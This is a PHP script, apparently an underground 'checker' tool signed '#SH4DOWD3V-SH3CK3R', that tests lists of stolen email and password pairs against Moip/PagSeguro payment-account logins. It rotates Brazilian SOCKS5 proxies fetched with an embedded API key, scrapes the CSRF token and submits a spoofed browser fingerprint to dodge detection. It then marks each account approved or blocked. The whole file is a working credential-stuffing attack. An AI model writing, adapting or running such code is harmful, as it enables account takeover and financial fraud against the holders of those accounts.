<?php
session_start();
 if(!$_SESSION['user'] == "paladino" and !$_SESSION['pass'] == "paladino"){  
   echo "<script>location.href='../'</script>";
 }
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');


extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$email = $separar[0];
$senha = $separar[1];

function checkProxy($proxy) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.cpanel.net/showip.cgi");
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $result = curl_exec($ch);
    if ($result !== FALSE) {
        return true;
    } else {
        return false;
    }
    curl_close($ch);
}

function getProxy() {

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://gimmeproxy.com/api/getProxy?api_key=0351ecb4-4ede-41b5-bb05-e2a81fbdfed6&protocol=socks5&country=BR');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/ml.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/ml.txt');
    $proxy = curl_exec($ch);
    $proxy = json_decode($proxy);

    return $proxy->ipPort;
}


function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
function ext($conteudo){
    $conteudo = explode("</p>", $conteudo);
    $conteudo = $conteudo[4];
    $conteudo = explode("'", $conteudo);
    $conteudo = $conteudo[7];
    $conteudo = explode(" ", $conteudo);
    $conteudo = $conteudo[92];
    return $conteudo;
}
$dir = dirname(__FILE__);
$config['cookie_file'] = $dir . '/cookies/' . md5($_SERVER['REMOTE_ADDR']) . '.txt';
if (!file_exists($config['cookie_file'])) {
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}

function delete_cookies() {
    global $config;
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}

function xflush() {
    static $output_handler = null;
    if ($output_handler === null) {
        $output_handler = @ini_get('output_handler');
    }
  
   if ($output_handler == 'ob_gzhandler') {
        return;
    }
    
    flush();
    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {
        @ob_flush();
    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {
        @ob_end_flush();
        @ob_start();
    }
}


if(file_exists(getcwd().'/pagseguro.txt')) {
        unlink(getcwd().'/pagseguro.txt'); 
    }



delete_cookies();

$ch = curl_init();
$proxy = getProxy();
while (!checkProxy($proxy)) {
    $proxy = getProxy();
}

curl_setopt($ch, CURLOPT_URL, "https://connect.moip.com.br/login?redirectTo=%2Foauth%2Fauthorize%3Fclient_id%3DAPP-UU899NH0LLM5%26redirect_uri%3Dhttps%253A%252F%252Fconta.moip.com.br%252Foauth%252Fcallback%26response_type%3Dcode%26scope%3DAPP_ADMIN");
curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/pagseguro.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/pagseguro.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://acesso.uol.com.br/login.html?skin=ps');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
$d1 = curl_exec($ch);

$token = getStr($d1,'type="hidden" name="_csrf" value="','"');

$ch = curl_init();

$proxy = getProxy();
while (!checkProxy($proxy)) {
    $proxy = getProxy();
}

curl_setopt($ch, CURLOPT_URL, "https://connect.moip.com.br/login");
curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/pagseguro.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/pagseguro.txt');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 1);                 
curl_setopt($ch, CURLOPT_POSTFIELDS, '_csrf='.urlencode($token).'&redirect_to=%2Foauth%2Fauthorize%3Fclient_id%3DAPP-UU899NH0LLM5%26redirect_uri%3Dhttps%253A%252F%252Fconta.moip.com.br%252Foauth%252Fcallback%26response_type%3Dcode%26scope%3DAPP_ADMIN&login='.$email.'&password='.$senha.'&fingerprint%5BfingerprintHash%5D=07cca2272577f961a9e287a4050fc320&fingerprint%5BuserAgent%5D=Mozilla%2F5.0+%28Windows+NT+6.1%3B+Win64%3B+x64%3B+rv%3A51.0%29+Gecko%2F20100101+Firefox%2F51.0&fingerprint%5BhardwareConcurrency%5D=2&fingerprint%5BcpuClass%5D=unknown&fingerprint%5Bplatform%5D=Win64&fingerprint%5BregularPlugins%5D=&fingerprint%5BcanvasFingerprint%5D=133cb310196e278cf86b7132ef2ec87aa290ed18&fingerprint%5BwebglFingerprint%5D=ea871e9254bc3f63db431ed57c3350380090ac02&fingerprint%5BtouchSupport%5D=0%2Cfalse%2Cfalse&fingerprint%5BjsFonts%5D=Arial%2CCalibri%2CCambria%2CCambria+Math%2CComic+Sans+MS%2CConsolas%2CCourier%2CCourier+New%2CGeorgia%2CHelvetica%2CImpact%2CLucida+Console%2CLucida+Sans+Unicode%2CMicrosoft+Sans+Serif%2CMS+Sans+Serif%2CMS+Serif%2CPalatino+Linotype%2CSegoe+Print%2CSegoe+Script%2CSegoe+UI%2CSegoe+UI+Symbol%2CTahoma%2CTimes%2CTimes+New+Roman%2CTrebuchet+MS%2CVerdana%2CWingdings'
);
$d2 = curl_exec($ch);
if ($d2) {
    if (stristr($d2, " veja o resumo da sua conta.") == !false) {
            echo '<span style="width:100% !important" class="label label-success">#Aprovada ✅ '.$email . ' | '.$senha.' Informaçoes |</br> Nome:'.$nome.' | Cpf:'.$cpf.' | Celular:'.$cell. '| Data de nascimento | Dia:'.$dia.'  |  Mes:'.$mes. ' | Ano:'.$ano.' | PROXY :  '. $proxy . '(' . (time() - $loadtime) .  ' seg) | DATA: '.$data. ' |</br> #SH4DOWD3V-SH3CK3R<br> </span> <br>';
    }else{
         echo '<span class="label label-danger">#Reprovada - Bloqueado ❌ '. $email .' | '. $senha .' | PROXY :  '. $proxy . '(' . (time() - $loadtime) .  ' seg) | DATA: '.$data. ' |  #SH4DOWD3V-SH3CK3R<br></span>';
    }
}
?>